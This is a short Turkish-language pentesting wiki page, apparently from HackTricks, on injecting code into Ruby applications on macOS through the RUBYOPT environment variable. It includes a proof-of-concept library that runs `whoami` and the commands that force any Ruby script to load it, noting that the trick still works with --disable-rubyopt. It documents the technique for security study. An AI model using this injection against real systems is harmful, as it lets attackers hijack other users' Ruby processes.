# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Bu env variable kullanılarak, **ruby** her çalıştırıldığında **yeni parametreler eklemek** mümkündür. Ruby kodunu çalıştırmak için **`-e`** parametresi kullanılamasa da, kütüphanelerin yükleme yoluna yeni bir klasör eklemek ve ardından **yüklenecek bir kütüphane belirtmek** için **`-I`** ve **`-r`** parametrelerini kullanmak mümkündür.

**`inject.rb`** kütüphanesini **`/tmp`** içinde oluşturun:
```ruby:inject.rb
puts `whoami`
```
Herhangi bir yerde şu tür bir ruby script oluşturun:
```ruby:hello.rb
puts 'Hello, World!'
```
Ardından, rastgele bir Ruby script'e bunu yükletin:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
İlginç bir bilgi: **`--disable-rubyopt`** parametresiyle bile çalışır:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
